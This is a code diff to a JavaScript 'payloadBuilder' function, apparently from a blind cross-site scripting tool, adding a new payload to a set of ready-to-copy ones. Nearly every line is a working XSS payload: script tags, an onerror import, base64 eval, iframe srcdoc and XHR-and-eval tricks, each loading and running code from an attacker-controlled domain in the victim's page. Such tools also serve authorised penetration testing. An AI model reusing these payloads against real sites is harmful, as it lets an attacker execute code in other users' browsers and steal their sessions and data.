@@ -82,6 +82,7 @@ function payloadBuilder(){
 	b64 = btoa(b64);
 	h = `<script>var a=parent.document.createElement("script");a.src="https://${xdomain}?n=${xnonce}";parent.document.body.appendChild(a);</script>`;
 	h = entityEncode(h);
+	p0 = `"><img src='z' onerror=import('https://${xdomain}?n=${xnonce}')>`;
 	p1 =`"><script src=https://${xdomain}?n=${xnonce}></script>`;
 	p2 =`javascript:eval('var a=document.createElement(\\\'script\\\');a.src=\\\'https://${xdomain}?n=${xnonce}\\\';document.body.appendChild(a)')`;
 	p3 =`"><input onfocus=eval(atob(this.id)) id=${b64} autofocus>`;
@@ -90,7 +91,7 @@ function payloadBuilder(){
 	p6 =`"><iframe srcdoc="${h}">`;
 	p7 =`<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//${xdomain}?n=${xnonce}");a.send();</script>`;
 	p8 =`<script>$.getScript("//${xdomain}?n=${xnonce}")</script>`;
-	
+	document.getElementById("payload0").value = p0;
 	document.getElementById("payload1").value = p1;
 	document.getElementById("payload2").value = p2;
 	document.getElementById("payload3").value = p3;
@@ -103,6 +104,7 @@ function payloadBuilder(){
 
 }
 function copyBuild(){
+	copyInputValue("payload0","copy0");
 	copyInputValue("payload1","copy1");
 	copyInputValue("payload2","copy2");
 	copyInputValue("payload3","copy3");
